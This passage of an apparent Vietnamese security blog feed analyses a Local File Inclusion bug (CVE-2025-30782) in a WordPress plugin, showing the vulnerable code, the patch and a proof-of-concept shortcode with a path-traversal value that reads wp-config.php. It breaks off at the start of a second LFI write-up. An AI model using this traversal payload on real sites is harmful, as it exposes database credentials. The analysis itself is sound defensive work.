stdl-alias&amp;gt;&amp;#34;&amp;gt;&#xA;    &amp;lt;form method=&amp;#34;post&amp;#34; action=&amp;#34;&amp;#34; class=&amp;#34;stdl-subscription-form&amp;#34; data-form-alias=&amp;#34;stdl&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        do_action(&amp;#39;stdl_before_form&amp;#39;, $form_details);&#xA;&#xA;        if (file_exists(STDL_PATH . &amp;#39;inc/views/frontend/form-templates/&amp;#39; . $form_template . &amp;#39;.php&amp;#39;)) {&#xA;            include(STDL_PATH . &amp;#39;inc/views/frontend/form-templates/&amp;#39; . $form_template . &amp;#39;.php&amp;#39;);&#xA;        }&#xA;        do_action(&amp;#39;stdl_after_form&amp;#39;, $form_details);&#xA;        ?&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, &lt;code&gt;$form_template&lt;/code&gt; được concat vào chuỗi và include nhưng không xác thực giá trị đầu vào =&amp;gt; nguy cơ LFI xảy ra, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$form_template = &amp;#39;../../../../../../../wp-config&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;stdl-form-wrap stdl-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt; stdl-alias&amp;gt;&amp;#34;&amp;gt;&#xA;    &amp;lt;form method=&amp;#34;post&amp;#34; action=&amp;#34;&amp;#34; class=&amp;#34;stdl-subscription-form&amp;#34; data-form-alias=&amp;#34;stdl&amp;#34;&amp;gt;&#xA;&#xA;        &amp;lt;?php&#xA;        do_action(&amp;#39;stdl_before_form&amp;#39;, $form_details);&#xA;&#xA;        $base_dir = realpath(STDL_PATH . &amp;#39;inc/views/frontend/form-templates&amp;#39;) . DIRECTORY_SEPARATOR;&#xA;        $sanitized_template = basename($form_template) . &amp;#39;.php&amp;#39;;&#xA;        $file_path = realpath($base_dir . $sanitized_template);&#xA;&#xA;        if ($file_path &amp;amp;&amp;amp; strpos($file_path, $base_dir) === 0 &amp;amp;&amp;amp; file_exists($file_path)) {&#xA;            include($file_path);&#xA;        }&#xA;        do_action(&amp;#39;stdl_after_form&amp;#39;, $form_details);&#xA;        ?&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá sử dụng &lt;a href=&#34;https://www.php.net/manual/en/function.basename.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;basename()&lt;/code&gt;&lt;/a&gt; để lấy phần tên file của &lt;code&gt;$form_template&lt;/code&gt; loại bỏ các ký tự traversal sequence &lt;code&gt;../&lt;/code&gt;, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;../../../../../../payload.pdf -&amp;gt; payload.pdf&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau đó concat vào &lt;code&gt;$base_dir&lt;/code&gt; và lấy đường dẫn tuyệt đối bằng &lt;a href=&#34;https://www.php.net/manual/en/function.realpath.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;realpath&lt;/code&gt;&lt;/a&gt; rồi &lt;code&gt;include()&lt;/code&gt; =&amp;gt; triệt tiêu hoàn toàn khả năng &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;form-template.php&lt;/code&gt; chứa code có lỗ hổng ở trên được gọi trong &lt;code&gt;stdl-shortcode.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;$form_template = (!empty($atts[&amp;#39;template&amp;#39;])) ? $atts[&amp;#39;template&amp;#39;] : $form_details[&amp;#39;layout&amp;#39;][&amp;#39;template&amp;#39;];&#xA;if (isset($_COOKIE[&amp;#39;stdl_encryption_key&amp;#39;]) &amp;amp;&amp;amp; $this-&amp;gt;check_if_already_subscribed($_COOKIE[&amp;#39;stdl_encryption_key&amp;#39;]) &amp;amp;&amp;amp; empty($form_details[&amp;#39;general&amp;#39;][&amp;#39;always_show&amp;#39;])) {&#xA;    // other logic&#xA;} else {&#xA;    // other logic&#xA;    if ($display_type == &amp;#39;direct&amp;#39;) {&#xA;        include(STDL_PATH . &amp;#39;inc/views/frontend/form-template.php&amp;#39;);&#xA;    } else {&#xA;        ?&amp;gt;&#xA;        &amp;lt;div class=&amp;#34;stdl-popup-outerwrap &amp;lt;?php echo esc_attr($popup_alias_class); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;input type=&amp;#34;button&amp;#34; class=&amp;#34;stdl-popup-trigger stdl-popup-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt;&amp;#34; value=&amp;#34;&amp;lt;?php echo esc_attr($popup_trigger_text); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;div class=&amp;#34;stdl-popup-innerwrap&amp;#34; style=&amp;#34;display:none;&amp;#34;&amp;gt;&#xA;                &amp;lt;div class=&amp;#34;stdl-overlay stdl-popup-wrapper&amp;#34;&amp;gt;&#xA;&#xA;                    &amp;lt;div class=&amp;#34;stdl-popup-contetn-wrap&amp;#34;&amp;gt;&#xA;                        &amp;lt;a href=&amp;#34;javascript:void(0)&amp;#34; class=&amp;#34;stdl-popup-close&amp;#34;&amp;gt;&amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&#xA;                            &amp;lt;?php include(STDL_PATH . &amp;#39;inc/views/frontend/form-template.php&amp;#39;);&#xA;                            ?&amp;gt;&#xA;                    &amp;lt;/div&amp;gt;&#xA;                &amp;lt;/div&amp;gt;&#xA;            &amp;lt;/div&amp;gt;&#xA;        &amp;lt;/div&amp;gt;&#xA;        &amp;lt;?php&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$form_template&lt;/code&gt; là giá trị của &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo kinh nghiệm phân tích CVE trên WordPress plugin của tôi, &lt;code&gt;$atts&lt;/code&gt; thường là các attribute của shortcode, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[pornhub id=69]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Có thể thấy rằng file &lt;code&gt;form-template.php&lt;/code&gt; &lt;strong&gt;luôn được include&lt;/strong&gt; trong khối &lt;code&gt;if-else&lt;/code&gt; nằm bên trong phần &lt;code&gt;else&lt;/code&gt;, &lt;strong&gt;khi cookie &lt;code&gt;stdl_encryption_key&lt;/code&gt; không tồn tại&lt;/strong&gt; (tức là người dùng chưa đăng ký hoặc chưa có khóa mã hóa hợp lệ).&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;stdl-shortcode.php&lt;/code&gt; được &lt;code&gt;include&lt;/code&gt; trong callback của shortcode &lt;code&gt;subscribe_to_download_form&lt;/code&gt; với &lt;code&gt;atts&lt;/code&gt; là mảng các attribute của shortcode.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function __construct() {&#xA;    add_shortcode(&amp;#39;subscribe_to_download_form&amp;#39;, array($this, &amp;#39;generate_shortcode_output&amp;#39;));&#xA;}&#xA;&#xA;function generate_shortcode_output($atts) {&#xA;    wp_enqueue_style(&amp;#39;stdl-frontend-custom&amp;#39;, STDL_CSS_DIR . &amp;#39;/stdl-custom.css&amp;#39;, array(), STDL_VERSION);&#xA;    ob_start();&#xA;    include(STDL_PATH . &amp;#39;inc/views/frontend/stdl-shortcode.php&amp;#39;);&#xA;    $form_html = ob_get_contents();&#xA;    ob_clean();&#xA;    return $form_html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Đăng nhập vào WordPress bằng tài khoản Contributor có đặc quyền thấp nhất để tạo post.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tạo post với shortcode&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[subscribe_to_download_form template=&amp;#39;../../../../../../../wp-config&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger đã nhảy đến &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-16-cve-2025-30782/result.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 1.2.9&lt;/strong&gt; của Subscribe to Download Lite cho phép LFI vì &lt;code&gt;include()&lt;/code&gt; dùng &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt; chưa được xác thực; lỗ hổng đã được vá trong &lt;strong&gt;1.3.0&lt;/strong&gt; bằng &lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; và kiểm tra &lt;code&gt;base_dir&lt;/code&gt;. Cập nhật ngay.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Input từ shortcode không được tin cậy — không include trực tiếp.&lt;/li&gt;&#xA;&lt;li&gt;Patch (v1.3.0) dùng &lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; + so sánh với thư mục cho phép.&lt;/li&gt;&#xA;&lt;li&gt;Hành động: cập nhật plugin, whitelist/validate attributes.&lt;/li&gt;&#xA;&lt;li&gt;Giám sát logs cho ký tự &lt;code&gt;../&lt;/code&gt; trong tham số template.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/subscribe-to-download-lite/vulnerability/wordpress-subscribe-to-download-lite-plugin-1-2-9-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Subscribe to Download Lite Plugin &amp;lt;= 1.2.9 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30868 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-15-cve-2025-30868/</link>
      <pubDate>Wed, 15 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-15-cve-2025-30868/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Team Manager&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 2.1.23&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30868&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30868&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.1.23&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-team-manager/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Team Manager Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Team Manager&lt;/strong&gt;: &lt;strong&gt;2.1.23&lt;/strong&gt; (vulnerable) và &lt;strong&gt;2.2.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 